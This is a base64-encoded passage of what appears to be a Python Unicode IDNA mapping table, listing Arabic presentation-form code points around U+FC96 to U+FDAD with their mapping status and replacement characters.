XHhkOVx4OGFceGQ5XHg4OVwnKSxcbiAgICAoMHhGQzk2LCBcJ01cJywgXCdceGQ5XHg4YVx4ZDlceDhhXCcpLFxuICAgICgweEZDOTcsIFwnTVwnLCBcJ1x4ZDhceGE2XHhkOFx4YWNcJyksXG4gICAgKDB4RkM5OCwgXCdNXCcsIFwnXHhkOFx4YTZceGQ4XHhhZFwnKSxcbiAgICAoMHhGQzk5LCBcJ01cJywgXCdceGQ4XHhhNlx4ZDhceGFlXCcpLFxuICAgICgweEZDOUEsIFwnTVwnLCBcJ1x4ZDhceGE2XHhkOVx4ODVcJyksXG4gICAgKDB4RkM5QiwgXCdNXCcsIFwnXHhkOFx4YTZceGQ5XHg4N1wnKSxcbiAgICAoMHhGQzlDLCBcJ01cJywgXCdceGQ4XHhhOFx4ZDhceGFjXCcpLFxuICAgICgweEZDOUQsIFwnTVwnLCBcJ1x4ZDhceGE4XHhkOFx4YWRcJyksXG4gICAgKDB4RkM5RSwgXCdNXCcsIFwnXHhkOFx4YThceGQ4XHhhZVwnKSxcbiAgICAoMHhGQzlGLCBcJ01cJywgXCdceGQ4XHhhOFx4ZDlceDg1XCcpLFxuICAgICgweEZDQTAsIFwnTVwnLCBcJ1x4ZDhceGE4XHhkOVx4ODdcJyksXG4gICAgKDB4RkNBMSwgXCdNXCcsIFwnXHhkOFx4YWFceGQ4XHhhY1wnKSxcbiAgICAoMHhGQ0EyLCBcJ01cJywgXCdceGQ4XHhhYVx4ZDhceGFkXCcpLFxuICAgICgweEZDQTMsIFwnTVwnLCBcJ1x4ZDhceGFhXHhkOFx4YWVcJyksXG4gICAgKDB4RkNBNCwgXCdNXCcsIFwnXHhkOFx4YWFceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0E1LCBcJ01cJywgXCdceGQ4XHhhYVx4ZDlceDg3XCcpLFxuICAgICgweEZDQTYsIFwnTVwnLCBcJ1x4ZDhceGFiXHhkOVx4ODVcJyksXG4gICAgKDB4RkNBNywgXCdNXCcsIFwnXHhkOFx4YWNceGQ4XHhhZFwnKSxcbiAgICAoMHhGQ0E4LCBcJ01cJywgXCdceGQ4XHhhY1x4ZDlceDg1XCcpLFxuICAgICgweEZDQTksIFwnTVwnLCBcJ1x4ZDhceGFkXHhkOFx4YWNcJyksXG4gICAgKDB4RkNBQSwgXCdNXCcsIFwnXHhkOFx4YWRceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0FCLCBcJ01cJywgXCdceGQ4XHhhZVx4ZDhceGFjXCcpLFxuICAgICgweEZDQUMsIFwnTVwnLCBcJ1x4ZDhceGFlXHhkOVx4ODVcJyksXG4gICAgKDB4RkNBRCwgXCdNXCcsIFwnXHhkOFx4YjNceGQ4XHhhY1wnKSxcbiAgICAoMHhGQ0FFLCBcJ01cJywgXCdceGQ4XHhiM1x4ZDhceGFkXCcpLFxuICAgICgweEZDQUYsIFwnTVwnLCBcJ1x4ZDhceGIzXHhkOFx4YWVcJyksXG4gICAgKDB4RkNCMCwgXCdNXCcsIFwnXHhkOFx4YjNceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0IxLCBcJ01cJywgXCdceGQ4XHhiNVx4ZDhceGFkXCcpLFxuICAgICgweEZDQjIsIFwnTVwnLCBcJ1x4ZDhceGI1XHhkOFx4YWVcJyksXG4gICAgKDB4RkNCMywgXCdNXCcsIFwnXHhkOFx4YjVceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0I0LCBcJ01cJywgXCdceGQ4XHhiNlx4ZDhceGFjXCcpLFxuICAgICgweEZDQjUsIFwnTVwnLCBcJ1x4ZDhceGI2XHhkOFx4YWRcJyksXG4gICAgKDB4RkNCNiwgXCdNXCcsIFwnXHhkOFx4YjZceGQ4XHhhZVwnKSxcbiAgICAoMHhGQ0I3LCBcJ01cJywgXCdceGQ4XHhiNlx4ZDlceDg1XCcpLFxuICAgICgweEZDQjgsIFwnTVwnLCBcJ1x4ZDhceGI3XHhkOFx4YWRcJyksXG4gICAgKDB4RkNCOSwgXCdNXCcsIFwnXHhkOFx4YjhceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0JBLCBcJ01cJywgXCdceGQ4XHhiOVx4ZDhceGFjXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfNDcoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweEZDQkIsIFwnTVwnLCBcJ1x4ZDhceGI5XHhkOVx4ODVcJyksXG4gICAgKDB4RkNCQywgXCdNXCcsIFwnXHhkOFx4YmFceGQ4XHhhY1wnKSxcbiAgICAoMHhGQ0JELCBcJ01cJywgXCdceGQ4XHhiYVx4ZDlceDg1XCcpLFxuICAgICgweEZDQkUsIFwnTVwnLCBcJ1x4ZDlceDgxXHhkOFx4YWNcJyksXG4gICAgKDB4RkNCRiwgXCdNXCcsIFwnXHhkOVx4ODFceGQ4XHhhZFwnKSxcbiAgICAoMHhGQ0MwLCBcJ01cJywgXCdceGQ5XHg4MVx4ZDhceGFlXCcpLFxuICAgICgweEZDQzEsIFwnTVwnLCBcJ1x4ZDlceDgxXHhkOVx4ODVcJyksXG4gICAgKDB4RkNDMiwgXCdNXCcsIFwnXHhkOVx4ODJceGQ4XHhhZFwnKSxcbiAgICAoMHhGQ0MzLCBcJ01cJywgXCdceGQ5XHg4Mlx4ZDlceDg1XCcpLFxuICAgICgweEZDQzQsIFwnTVwnLCBcJ1x4ZDlceDgzXHhkOFx4YWNcJyksXG4gICAgKDB4RkNDNSwgXCdNXCcsIFwnXHhkOVx4ODNceGQ4XHhhZFwnKSxcbiAgICAoMHhGQ0M2LCBcJ01cJywgXCdceGQ5XHg4M1x4ZDhceGFlXCcpLFxuICAgICgweEZDQzcsIFwnTVwnLCBcJ1x4ZDlceDgzXHhkOVx4ODRcJyksXG4gICAgKDB4RkNDOCwgXCdNXCcsIFwnXHhkOVx4ODNceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0M5LCBcJ01cJywgXCdceGQ5XHg4NFx4ZDhceGFjXCcpLFxuICAgICgweEZDQ0EsIFwnTVwnLCBcJ1x4ZDlceDg0XHhkOFx4YWRcJyksXG4gICAgKDB4RkNDQiwgXCdNXCcsIFwnXHhkOVx4ODRceGQ4XHhhZVwnKSxcbiAgICAoMHhGQ0NDLCBcJ01cJywgXCdceGQ5XHg4NFx4ZDlceDg1XCcpLFxuICAgICgweEZDQ0QsIFwnTVwnLCBcJ1x4ZDlceDg0XHhkOVx4ODdcJyksXG4gICAgKDB4RkNDRSwgXCdNXCcsIFwnXHhkOVx4ODVceGQ4XHhhY1wnKSxcbiAgICAoMHhGQ0NGLCBcJ01cJywgXCdceGQ5XHg4NVx4ZDhceGFkXCcpLFxuICAgICgweEZDRDAsIFwnTVwnLCBcJ1x4ZDlceDg1XHhkOFx4YWVcJyksXG4gICAgKDB4RkNEMSwgXCdNXCcsIFwnXHhkOVx4ODVceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0QyLCBcJ01cJywgXCdceGQ5XHg4Nlx4ZDhceGFjXCcpLFxuICAgICgweEZDRDMsIFwnTVwnLCBcJ1x4ZDlceDg2XHhkOFx4YWRcJyksXG4gICAgKDB4RkNENCwgXCdNXCcsIFwnXHhkOVx4ODZceGQ4XHhhZVwnKSxcbiAgICAoMHhGQ0Q1LCBcJ01cJywgXCdceGQ5XHg4Nlx4ZDlceDg1XCcpLFxuICAgICgweEZDRDYsIFwnTVwnLCBcJ1x4ZDlceDg2XHhkOVx4ODdcJyksXG4gICAgKDB4RkNENywgXCdNXCcsIFwnXHhkOVx4ODdceGQ4XHhhY1wnKSxcbiAgICAoMHhGQ0Q4LCBcJ01cJywgXCdceGQ5XHg4N1x4ZDlceDg1XCcpLFxuICAgICgweEZDRDksIFwnTVwnLCBcJ1x4ZDlceDg3XHhkOVx4YjBcJyksXG4gICAgKDB4RkNEQSwgXCdNXCcsIFwnXHhkOVx4OGFceGQ4XHhhY1wnKSxcbiAgICAoMHhGQ0RCLCBcJ01cJywgXCdceGQ5XHg4YVx4ZDhceGFkXCcpLFxuICAgICgweEZDREMsIFwnTVwnLCBcJ1x4ZDlceDhhXHhkOFx4YWVcJyksXG4gICAgKDB4RkNERCwgXCdNXCcsIFwnXHhkOVx4OGFceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0RFLCBcJ01cJywgXCdceGQ5XHg4YVx4ZDlceDg3XCcpLFxuICAgICgweEZDREYsIFwnTVwnLCBcJ1x4ZDhceGE2XHhkOVx4ODVcJyksXG4gICAgKDB4RkNFMCwgXCdNXCcsIFwnXHhkOFx4YTZceGQ5XHg4N1wnKSxcbiAgICAoMHhGQ0UxLCBcJ01cJywgXCdceGQ4XHhhOFx4ZDlceDg1XCcpLFxuICAgICgweEZDRTIsIFwnTVwnLCBcJ1x4ZDhceGE4XHhkOVx4ODdcJyksXG4gICAgKDB4RkNFMywgXCdNXCcsIFwnXHhkOFx4YWFceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0U0LCBcJ01cJywgXCdceGQ4XHhhYVx4ZDlceDg3XCcpLFxuICAgICgweEZDRTUsIFwnTVwnLCBcJ1x4ZDhceGFiXHhkOVx4ODVcJyksXG4gICAgKDB4RkNFNiwgXCdNXCcsIFwnXHhkOFx4YWJceGQ5XHg4N1wnKSxcbiAgICAoMHhGQ0U3LCBcJ01cJywgXCdceGQ4XHhiM1x4ZDlceDg1XCcpLFxuICAgICgweEZDRTgsIFwnTVwnLCBcJ1x4ZDhceGIzXHhkOVx4ODdcJyksXG4gICAgKDB4RkNFOSwgXCdNXCcsIFwnXHhkOFx4YjRceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0VBLCBcJ01cJywgXCdceGQ4XHhiNFx4ZDlceDg3XCcpLFxuICAgICgweEZDRUIsIFwnTVwnLCBcJ1x4ZDlceDgzXHhkOVx4ODRcJyksXG4gICAgKDB4RkNFQywgXCdNXCcsIFwnXHhkOVx4ODNceGQ5XHg4NVwnKSxcbiAgICAoMHhGQ0VELCBcJ01cJywgXCdceGQ5XHg4NFx4ZDlceDg1XCcpLFxuICAgICgweEZDRUUsIFwnTVwnLCBcJ1x4ZDlceDg2XHhkOVx4ODVcJyksXG4gICAgKDB4RkNFRiwgXCdNXCcsIFwnXHhkOVx4ODZceGQ5XHg4N1wnKSxcbiAgICAoMHhGQ0YwLCBcJ01cJywgXCdceGQ5XHg4YVx4ZDlceDg1XCcpLFxuICAgICgweEZDRjEsIFwnTVwnLCBcJ1x4ZDlceDhhXHhkOVx4ODdcJyksXG4gICAgKDB4RkNGMiwgXCdNXCcsIFwnXHhkOVx4ODBceGQ5XHg4ZVx4ZDlceDkxXCcpLFxuICAgICgweEZDRjMsIFwnTVwnLCBcJ1x4ZDlceDgwXHhkOVx4OGZceGQ5XHg5MVwnKSxcbiAgICAoMHhGQ0Y0LCBcJ01cJywgXCdceGQ5XHg4MFx4ZDlceDkwXHhkOVx4OTFcJyksXG4gICAgKDB4RkNGNSwgXCdNXCcsIFwnXHhkOFx4YjdceGQ5XHg4OVwnKSxcbiAgICAoMHhGQ0Y2LCBcJ01cJywgXCdceGQ4XHhiN1x4ZDlceDhhXCcpLFxuICAgICgweEZDRjcsIFwnTVwnLCBcJ1x4ZDhceGI5XHhkOVx4ODlcJyksXG4gICAgKDB4RkNGOCwgXCdNXCcsIFwnXHhkOFx4YjlceGQ5XHg4YVwnKSxcbiAgICAoMHhGQ0Y5LCBcJ01cJywgXCdceGQ4XHhiYVx4ZDlceDg5XCcpLFxuICAgICgweEZDRkEsIFwnTVwnLCBcJ1x4ZDhceGJhXHhkOVx4OGFcJyksXG4gICAgKDB4RkNGQiwgXCdNXCcsIFwnXHhkOFx4YjNceGQ5XHg4OVwnKSxcbiAgICAoMHhGQ0ZDLCBcJ01cJywgXCdceGQ4XHhiM1x4ZDlceDhhXCcpLFxuICAgICgweEZDRkQsIFwnTVwnLCBcJ1x4ZDhceGI0XHhkOVx4ODlcJyksXG4gICAgKDB4RkNGRSwgXCdNXCcsIFwnXHhkOFx4YjRceGQ5XHg4YVwnKSxcbiAgICAoMHhGQ0ZGLCBcJ01cJywgXCdceGQ4XHhhZFx4ZDlceDg5XCcpLFxuICAgICgweEZEMDAsIFwnTVwnLCBcJ1x4ZDhceGFkXHhkOVx4OGFcJyksXG4gICAgKDB4RkQwMSwgXCdNXCcsIFwnXHhkOFx4YWNceGQ5XHg4OVwnKSxcbiAgICAoMHhGRDAyLCBcJ01cJywgXCdceGQ4XHhhY1x4ZDlceDhhXCcpLFxuICAgICgweEZEMDMsIFwnTVwnLCBcJ1x4ZDhceGFlXHhkOVx4ODlcJyksXG4gICAgKDB4RkQwNCwgXCdNXCcsIFwnXHhkOFx4YWVceGQ5XHg4YVwnKSxcbiAgICAoMHhGRDA1LCBcJ01cJywgXCdceGQ4XHhiNVx4ZDlceDg5XCcpLFxuICAgICgweEZEMDYsIFwnTVwnLCBcJ1x4ZDhceGI1XHhkOVx4OGFcJyksXG4gICAgKDB4RkQwNywgXCdNXCcsIFwnXHhkOFx4YjZceGQ5XHg4OVwnKSxcbiAgICAoMHhGRDA4LCBcJ01cJywgXCdceGQ4XHhiNlx4ZDlceDhhXCcpLFxuICAgICgweEZEMDksIFwnTVwnLCBcJ1x4ZDhceGI0XHhkOFx4YWNcJyksXG4gICAgKDB4RkQwQSwgXCdNXCcsIFwnXHhkOFx4YjRceGQ4XHhhZFwnKSxcbiAgICAoMHhGRDBCLCBcJ01cJywgXCdceGQ4XHhiNFx4ZDhceGFlXCcpLFxuICAgICgweEZEMEMsIFwnTVwnLCBcJ1x4ZDhceGI0XHhkOVx4ODVcJyksXG4gICAgKDB4RkQwRCwgXCdNXCcsIFwnXHhkOFx4YjRceGQ4XHhiMVwnKSxcbiAgICAoMHhGRDBFLCBcJ01cJywgXCdceGQ4XHhiM1x4ZDhceGIxXCcpLFxuICAgICgweEZEMEYsIFwnTVwnLCBcJ1x4ZDhceGI1XHhkOFx4YjFcJyksXG4gICAgKDB4RkQxMCwgXCdNXCcsIFwnXHhkOFx4YjZceGQ4XHhiMVwnKSxcbiAgICAoMHhGRDExLCBcJ01cJywgXCdceGQ4XHhiN1x4ZDlceDg5XCcpLFxuICAgICgweEZEMTIsIFwnTVwnLCBcJ1x4ZDhceGI3XHhkOVx4OGFcJyksXG4gICAgKDB4RkQxMywgXCdNXCcsIFwnXHhkOFx4YjlceGQ5XHg4OVwnKSxcbiAgICAoMHhGRDE0LCBcJ01cJywgXCdceGQ4XHhiOVx4ZDlceDhhXCcpLFxuICAgICgweEZEMTUsIFwnTVwnLCBcJ1x4ZDhceGJhXHhkOVx4ODlcJyksXG4gICAgKDB4RkQxNiwgXCdNXCcsIFwnXHhkOFx4YmFceGQ5XHg4YVwnKSxcbiAgICAoMHhGRDE3LCBcJ01cJywgXCdceGQ4XHhiM1x4ZDlceDg5XCcpLFxuICAgICgweEZEMTgsIFwnTVwnLCBcJ1x4ZDhceGIzXHhkOVx4OGFcJyksXG4gICAgKDB4RkQxOSwgXCdNXCcsIFwnXHhkOFx4YjRceGQ5XHg4OVwnKSxcbiAgICAoMHhGRDFBLCBcJ01cJywgXCdceGQ4XHhiNFx4ZDlceDhhXCcpLFxuICAgICgweEZEMUIsIFwnTVwnLCBcJ1x4ZDhceGFkXHhkOVx4ODlcJyksXG4gICAgKDB4RkQxQywgXCdNXCcsIFwnXHhkOFx4YWRceGQ5XHg4YVwnKSxcbiAgICAoMHhGRDFELCBcJ01cJywgXCdceGQ4XHhhY1x4ZDlceDg5XCcpLFxuICAgICgweEZEMUUsIFwnTVwnLCBcJ1x4ZDhceGFjXHhkOVx4OGFcJyksXG4gICAgXVxuXG5kZWYgX3NlZ180OCgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4RkQxRiwgXCdNXCcsIFwnXHhkOFx4YWVceGQ5XHg4OVwnKSxcbiAgICAoMHhGRDIwLCBcJ01cJywgXCdceGQ4XHhhZVx4ZDlceDhhXCcpLFxuICAgICgweEZEMjEsIFwnTVwnLCBcJ1x4ZDhceGI1XHhkOVx4ODlcJyksXG4gICAgKDB4RkQyMiwgXCdNXCcsIFwnXHhkOFx4YjVceGQ5XHg4YVwnKSxcbiAgICAoMHhGRDIzLCBcJ01cJywgXCdceGQ4XHhiNlx4ZDlceDg5XCcpLFxuICAgICgweEZEMjQsIFwnTVwnLCBcJ1x4ZDhceGI2XHhkOVx4OGFcJyksXG4gICAgKDB4RkQyNSwgXCdNXCcsIFwnXHhkOFx4YjRceGQ4XHhhY1wnKSxcbiAgICAoMHhGRDI2LCBcJ01cJywgXCdceGQ4XHhiNFx4ZDhceGFkXCcpLFxuICAgICgweEZEMjcsIFwnTVwnLCBcJ1x4ZDhceGI0XHhkOFx4YWVcJyksXG4gICAgKDB4RkQyOCwgXCdNXCcsIFwnXHhkOFx4YjRceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDI5LCBcJ01cJywgXCdceGQ4XHhiNFx4ZDhceGIxXCcpLFxuICAgICgweEZEMkEsIFwnTVwnLCBcJ1x4ZDhceGIzXHhkOFx4YjFcJyksXG4gICAgKDB4RkQyQiwgXCdNXCcsIFwnXHhkOFx4YjVceGQ4XHhiMVwnKSxcbiAgICAoMHhGRDJDLCBcJ01cJywgXCdceGQ4XHhiNlx4ZDhceGIxXCcpLFxuICAgICgweEZEMkQsIFwnTVwnLCBcJ1x4ZDhceGI0XHhkOFx4YWNcJyksXG4gICAgKDB4RkQyRSwgXCdNXCcsIFwnXHhkOFx4YjRceGQ4XHhhZFwnKSxcbiAgICAoMHhGRDJGLCBcJ01cJywgXCdceGQ4XHhiNFx4ZDhceGFlXCcpLFxuICAgICgweEZEMzAsIFwnTVwnLCBcJ1x4ZDhceGI0XHhkOVx4ODVcJyksXG4gICAgKDB4RkQzMSwgXCdNXCcsIFwnXHhkOFx4YjNceGQ5XHg4N1wnKSxcbiAgICAoMHhGRDMyLCBcJ01cJywgXCdceGQ4XHhiNFx4ZDlceDg3XCcpLFxuICAgICgweEZEMzMsIFwnTVwnLCBcJ1x4ZDhceGI3XHhkOVx4ODVcJyksXG4gICAgKDB4RkQzNCwgXCdNXCcsIFwnXHhkOFx4YjNceGQ4XHhhY1wnKSxcbiAgICAoMHhGRDM1LCBcJ01cJywgXCdceGQ4XHhiM1x4ZDhceGFkXCcpLFxuICAgICgweEZEMzYsIFwnTVwnLCBcJ1x4ZDhceGIzXHhkOFx4YWVcJyksXG4gICAgKDB4RkQzNywgXCdNXCcsIFwnXHhkOFx4YjRceGQ4XHhhY1wnKSxcbiAgICAoMHhGRDM4LCBcJ01cJywgXCdceGQ4XHhiNFx4ZDhceGFkXCcpLFxuICAgICgweEZEMzksIFwnTVwnLCBcJ1x4ZDhceGI0XHhkOFx4YWVcJyksXG4gICAgKDB4RkQzQSwgXCdNXCcsIFwnXHhkOFx4YjdceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDNCLCBcJ01cJywgXCdceGQ4XHhiOFx4ZDlceDg1XCcpLFxuICAgICgweEZEM0MsIFwnTVwnLCBcJ1x4ZDhceGE3XHhkOVx4OGJcJyksXG4gICAgKDB4RkQzRSwgXCdWXCcpLFxuICAgICgweEZENTAsIFwnTVwnLCBcJ1x4ZDhceGFhXHhkOFx4YWNceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDUxLCBcJ01cJywgXCdceGQ4XHhhYVx4ZDhceGFkXHhkOFx4YWNcJyksXG4gICAgKDB4RkQ1MywgXCdNXCcsIFwnXHhkOFx4YWFceGQ4XHhhZFx4ZDlceDg1XCcpLFxuICAgICgweEZENTQsIFwnTVwnLCBcJ1x4ZDhceGFhXHhkOFx4YWVceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDU1LCBcJ01cJywgXCdceGQ4XHhhYVx4ZDlceDg1XHhkOFx4YWNcJyksXG4gICAgKDB4RkQ1NiwgXCdNXCcsIFwnXHhkOFx4YWFceGQ5XHg4NVx4ZDhceGFkXCcpLFxuICAgICgweEZENTcsIFwnTVwnLCBcJ1x4ZDhceGFhXHhkOVx4ODVceGQ4XHhhZVwnKSxcbiAgICAoMHhGRDU4LCBcJ01cJywgXCdceGQ4XHhhY1x4ZDlceDg1XHhkOFx4YWRcJyksXG4gICAgKDB4RkQ1QSwgXCdNXCcsIFwnXHhkOFx4YWRceGQ5XHg4NVx4ZDlceDhhXCcpLFxuICAgICgweEZENUIsIFwnTVwnLCBcJ1x4ZDhceGFkXHhkOVx4ODVceGQ5XHg4OVwnKSxcbiAgICAoMHhGRDVDLCBcJ01cJywgXCdceGQ4XHhiM1x4ZDhceGFkXHhkOFx4YWNcJyksXG4gICAgKDB4RkQ1RCwgXCdNXCcsIFwnXHhkOFx4YjNceGQ4XHhhY1x4ZDhceGFkXCcpLFxuICAgICgweEZENUUsIFwnTVwnLCBcJ1x4ZDhceGIzXHhkOFx4YWNceGQ5XHg4OVwnKSxcbiAgICAoMHhGRDVGLCBcJ01cJywgXCdceGQ4XHhiM1x4ZDlceDg1XHhkOFx4YWRcJyksXG4gICAgKDB4RkQ2MSwgXCdNXCcsIFwnXHhkOFx4YjNceGQ5XHg4NVx4ZDhceGFjXCcpLFxuICAgICgweEZENjIsIFwnTVwnLCBcJ1x4ZDhceGIzXHhkOVx4ODVceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDY0LCBcJ01cJywgXCdceGQ4XHhiNVx4ZDhceGFkXHhkOFx4YWRcJyksXG4gICAgKDB4RkQ2NiwgXCdNXCcsIFwnXHhkOFx4YjVceGQ5XHg4NVx4ZDlceDg1XCcpLFxuICAgICgweEZENjcsIFwnTVwnLCBcJ1x4ZDhceGI0XHhkOFx4YWRceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDY5LCBcJ01cJywgXCdceGQ4XHhiNFx4ZDhceGFjXHhkOVx4OGFcJyksXG4gICAgKDB4RkQ2QSwgXCdNXCcsIFwnXHhkOFx4YjRceGQ5XHg4NVx4ZDhceGFlXCcpLFxuICAgICgweEZENkMsIFwnTVwnLCBcJ1x4ZDhceGI0XHhkOVx4ODVceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDZFLCBcJ01cJywgXCdceGQ4XHhiNlx4ZDhceGFkXHhkOVx4ODlcJyksXG4gICAgKDB4RkQ2RiwgXCdNXCcsIFwnXHhkOFx4YjZceGQ4XHhhZVx4ZDlceDg1XCcpLFxuICAgICgweEZENzEsIFwnTVwnLCBcJ1x4ZDhceGI3XHhkOVx4ODVceGQ4XHhhZFwnKSxcbiAgICAoMHhGRDczLCBcJ01cJywgXCdceGQ4XHhiN1x4ZDlceDg1XHhkOVx4ODVcJyksXG4gICAgKDB4RkQ3NCwgXCdNXCcsIFwnXHhkOFx4YjdceGQ5XHg4NVx4ZDlceDhhXCcpLFxuICAgICgweEZENzUsIFwnTVwnLCBcJ1x4ZDhceGI5XHhkOFx4YWNceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDc2LCBcJ01cJywgXCdceGQ4XHhiOVx4ZDlceDg1XHhkOVx4ODVcJyksXG4gICAgKDB4RkQ3OCwgXCdNXCcsIFwnXHhkOFx4YjlceGQ5XHg4NVx4ZDlceDg5XCcpLFxuICAgICgweEZENzksIFwnTVwnLCBcJ1x4ZDhceGJhXHhkOVx4ODVceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDdBLCBcJ01cJywgXCdceGQ4XHhiYVx4ZDlceDg1XHhkOVx4OGFcJyksXG4gICAgKDB4RkQ3QiwgXCdNXCcsIFwnXHhkOFx4YmFceGQ5XHg4NVx4ZDlceDg5XCcpLFxuICAgICgweEZEN0MsIFwnTVwnLCBcJ1x4ZDlceDgxXHhkOFx4YWVceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDdFLCBcJ01cJywgXCdceGQ5XHg4Mlx4ZDlceDg1XHhkOFx4YWRcJyksXG4gICAgKDB4RkQ3RiwgXCdNXCcsIFwnXHhkOVx4ODJceGQ5XHg4NVx4ZDlceDg1XCcpLFxuICAgICgweEZEODAsIFwnTVwnLCBcJ1x4ZDlceDg0XHhkOFx4YWRceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDgxLCBcJ01cJywgXCdceGQ5XHg4NFx4ZDhceGFkXHhkOVx4OGFcJyksXG4gICAgKDB4RkQ4MiwgXCdNXCcsIFwnXHhkOVx4ODRceGQ4XHhhZFx4ZDlceDg5XCcpLFxuICAgICgweEZEODMsIFwnTVwnLCBcJ1x4ZDlceDg0XHhkOFx4YWNceGQ4XHhhY1wnKSxcbiAgICAoMHhGRDg1LCBcJ01cJywgXCdceGQ5XHg4NFx4ZDhceGFlXHhkOVx4ODVcJyksXG4gICAgKDB4RkQ4NywgXCdNXCcsIFwnXHhkOVx4ODRceGQ5XHg4NVx4ZDhceGFkXCcpLFxuICAgICgweEZEODksIFwnTVwnLCBcJ1x4ZDlceDg1XHhkOFx4YWRceGQ4XHhhY1wnKSxcbiAgICAoMHhGRDhBLCBcJ01cJywgXCdceGQ5XHg4NVx4ZDhceGFkXHhkOVx4ODVcJyksXG4gICAgKDB4RkQ4QiwgXCdNXCcsIFwnXHhkOVx4ODVceGQ4XHhhZFx4ZDlceDhhXCcpLFxuICAgICgweEZEOEMsIFwnTVwnLCBcJ1x4ZDlceDg1XHhkOFx4YWNceGQ4XHhhZFwnKSxcbiAgICAoMHhGRDhELCBcJ01cJywgXCdceGQ5XHg4NVx4ZDhceGFjXHhkOVx4ODVcJyksXG4gICAgKDB4RkQ4RSwgXCdNXCcsIFwnXHhkOVx4ODVceGQ4XHhhZVx4ZDhceGFjXCcpLFxuICAgICgweEZEOEYsIFwnTVwnLCBcJ1x4ZDlceDg1XHhkOFx4YWVceGQ5XHg4NVwnKSxcbiAgICAoMHhGRDkwLCBcJ1hcJyksXG4gICAgKDB4RkQ5MiwgXCdNXCcsIFwnXHhkOVx4ODVceGQ4XHhhY1x4ZDhceGFlXCcpLFxuICAgICgweEZEOTMsIFwnTVwnLCBcJ1x4ZDlceDg3XHhkOVx4ODVceGQ4XHhhY1wnKSxcbiAgICAoMHhGRDk0LCBcJ01cJywgXCdceGQ5XHg4N1x4ZDlceDg1XHhkOVx4ODVcJyksXG4gICAgKDB4RkQ5NSwgXCdNXCcsIFwnXHhkOVx4ODZceGQ4XHhhZFx4ZDlceDg1XCcpLFxuICAgICgweEZEOTYsIFwnTVwnLCBcJ1x4ZDlceDg2XHhkOFx4YWRceGQ5XHg4OVwnKSxcbiAgICAoMHhGRDk3LCBcJ01cJywgXCdceGQ5XHg4Nlx4ZDhceGFjXHhkOVx4ODVcJyksXG4gICAgKDB4RkQ5OSwgXCdNXCcsIFwnXHhkOVx4ODZceGQ4XHhhY1x4ZDlceDg5XCcpLFxuICAgICgweEZEOUEsIFwnTVwnLCBcJ1x4ZDlceDg2XHhkOVx4ODVceGQ5XHg4YVwnKSxcbiAgICAoMHhGRDlCLCBcJ01cJywgXCdceGQ5XHg4Nlx4ZDlceDg1XHhkOVx4ODlcJyksXG4gICAgKDB4RkQ5QywgXCdNXCcsIFwnXHhkOVx4OGFceGQ5XHg4NVx4ZDlceDg1XCcpLFxuICAgICgweEZEOUUsIFwnTVwnLCBcJ1x4ZDhceGE4XHhkOFx4YWVceGQ5XHg4YVwnKSxcbiAgICAoMHhGRDlGLCBcJ01cJywgXCdceGQ4XHhhYVx4ZDhceGFjXHhkOVx4OGFcJyksXG4gICAgKDB4RkRBMCwgXCdNXCcsIFwnXHhkOFx4YWFceGQ4XHhhY1x4ZDlceDg5XCcpLFxuICAgICgweEZEQTEsIFwnTVwnLCBcJ1x4ZDhceGFhXHhkOFx4YWVceGQ5XHg4YVwnKSxcbiAgICAoMHhGREEyLCBcJ01cJywgXCdceGQ4XHhhYVx4ZDhceGFlXHhkOVx4ODlcJyksXG4gICAgKDB4RkRBMywgXCdNXCcsIFwnXHhkOFx4YWFceGQ5XHg4NVx4ZDlceDhhXCcpLFxuICAgICgweEZEQTQsIFwnTVwnLCBcJ1x4ZDhceGFhXHhkOVx4ODVceGQ5XHg4OVwnKSxcbiAgICAoMHhGREE1LCBcJ01cJywgXCdceGQ4XHhhY1x4ZDlceDg1XHhkOVx4OGFcJyksXG4gICAgKDB4RkRBNiwgXCdNXCcsIFwnXHhkOFx4YWNceGQ4XHhhZFx4ZDlceDg5XCcpLFxuICAgIF1cblxuZGVmIF9zZWdfNDkoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweEZEQTcsIFwnTVwnLCBcJ1x4ZDhceGFjXHhkOVx4ODVceGQ5XHg4OVwnKSxcbiAgICAoMHhGREE4LCBcJ01cJywgXCdceGQ4XHhiM1x4ZDhceGFlXHhkOVx4ODlcJyksXG4gICAgKDB4RkRBOSwgXCdNXCcsIFwnXHhkOFx4YjVceGQ4XHhhZFx4ZDlceDhhXCcpLFxuICAgICgweEZEQUEsIFwnTVwnLCBcJ1x4ZDhceGI0XHhkOFx4YWRceGQ5XHg4YVwnKSxcbiAgICAoMHhGREFCLCBcJ01cJywgXCdceGQ4XHhiNlx4ZDhceGFkXHhkOVx4OGFcJyksXG4gICAgKDB4RkRBQywgXCdNXCcsIFwnXHhkOVx4ODRceGQ4XHhhY1x4ZDlceDhhXCcpLFxuICAgICgweEZEQUQsIFwnTVwnLCBcJ1x4ZDlceDg0XHhkOVx4ODVceGQ5XHg4YVwnKSxcb